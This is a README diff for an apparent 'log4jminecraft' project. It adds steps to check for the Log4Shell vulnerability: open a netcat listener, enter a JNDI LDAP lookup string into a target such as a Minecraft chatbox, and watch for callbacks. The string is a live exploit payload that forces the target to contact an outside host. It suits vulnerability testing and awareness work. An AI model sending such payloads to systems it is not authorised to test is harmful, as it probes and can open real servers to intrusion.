@@ -1,3 +1,12 @@
+# Checking the vulnerability
+Spin up `nc` or any kind of port listener.
+```nc -nlvp 1389```
+
+On the vulnerable endpoint, such as minecraft chatbox, enter the following string.
+```${jndi:ldap://<nc-listener-ip>:1389}```
+
+Monitor the listener for any kind of connections. This confirms the vulnerability.
+
 # log4jminecraft
 This code *DOES NOT* promote or encourage any illegal activities!
 The content in this document is provided solely for educational purposes and to create awareness!
